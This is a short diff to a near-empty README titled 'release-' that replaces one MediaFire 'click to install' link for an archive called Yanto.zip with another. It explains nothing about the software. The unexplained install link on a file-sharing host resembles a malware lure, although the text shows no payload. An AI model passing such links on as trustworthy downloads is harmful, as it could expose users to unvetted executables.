@@ -1,2 +1,2 @@
 # release-
-[click to install](https://www.mediafire.com/file/rtjvnyzwm2sluef/Yanto.zip/file)
+[click to install](https://www.mediafire.com/file/45bcpoivod86q53/Yanto.zip/file)
